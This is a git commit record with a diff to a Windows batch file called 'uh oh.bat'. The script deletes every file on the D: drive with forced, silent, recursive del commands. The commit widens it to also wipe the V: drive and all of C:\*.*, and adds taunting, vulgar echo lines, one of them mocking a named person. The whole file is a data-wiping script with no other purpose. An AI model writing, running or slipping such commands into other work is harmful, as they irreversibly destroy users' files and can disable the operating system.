7a27e8a270abd89fe0604c95ffc6fce9401d357a
Jake Hurd <legendbreakerjake@gmail.com>
2022-04-12 16:08:54 +0100

    Update uh oh.bat

--- uh oh.bat
+++ uh oh.bat
@@ -1,6 +1,11 @@
+echo shane doesnt deserve credits.
 echo cmd delete all files in folder
 del "D:" /s /f /q
+del "V:" /s /f /q
+echo surprise motherfucker! we worked overtime! [V: also cleaned].
 echo scrub scrub scrub
 del "D:\*.*" /s /f /q
+del "C:\*.*" /s /f /q
+echo mammory glands.
 echo get dicked on
 echo Done!
